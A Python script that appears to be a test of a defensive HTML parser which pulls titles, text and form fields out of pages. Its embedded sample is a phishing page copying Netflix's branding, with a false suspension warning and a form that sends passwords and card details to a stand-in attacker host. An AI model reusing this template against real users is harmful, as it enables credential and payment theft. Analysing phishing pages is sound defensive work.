import urllib.parse
from html.parser import HTMLParser

class SafePageExtractor(HTMLParser):
    def __init__(self):
        super().__init__()
        self.title = ''
        self.in_title = False
        self.text_chunks = []
        self.in_script = False
        self.inputs = []
        self.forms = []
        self.links = []
        
    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag in ['script', 'style', 'noscript']:
            self.in_script = True
        elif tag == 'title':
            self.in_title = True
        elif tag == 'input':
            self.inputs.append(attrs_dict)
        elif tag == 'form':
            self.forms.append(attrs_dict)
        elif tag == 'a':
            if 'href' in attrs_dict:
                self.links.append(attrs_dict['href'])
                
    def handle_endtag(self, tag):
        if tag in ['script', 'style', 'noscript']:
            self.in_script = False
        elif tag == 'title':
            self.in_title = False
            
    def handle_data(self, data):
        if self.in_title:
            self.title += data
        elif not self.in_script:
            txt = data.strip()
            if txt:
                self.text_chunks.append(txt)

sample_html = '''
<!DOCTYPE html>
<html>
<head>
  <title>Netflix - Watch TV Shows Online, Watch Movies Online</title>
</head>
<body>
  <h1>Sign In</h1>
  <p>Your subscription is suspended! Update payment within 24 hours.</p>
  <form action="https://evil-harvest.top/steal">
    <input type="text" name="email" placeholder="Email or phone number" />
    <input type="password" name="password" placeholder="Password" />
    <input type="text" name="card_number" placeholder="Card Number" />
    <input type="text" name="cvv" placeholder="CVV" />
    <button type="submit">Sign In</button>
  </form>
  <footer>© 2026 Netflix, Inc. All rights reserved.</footer>
</body>
</html>
'''

p = SafePageExtractor()
p.feed(sample_html)
print("Title:", p.title)
print("Inputs:", len(p.inputs))
for inp in p.inputs:
    print("  Input:", inp.get("type"), inp.get("name"), inp.get("placeholder"))
print("Text snippet:", " ".join(p.text_chunks)[:150])
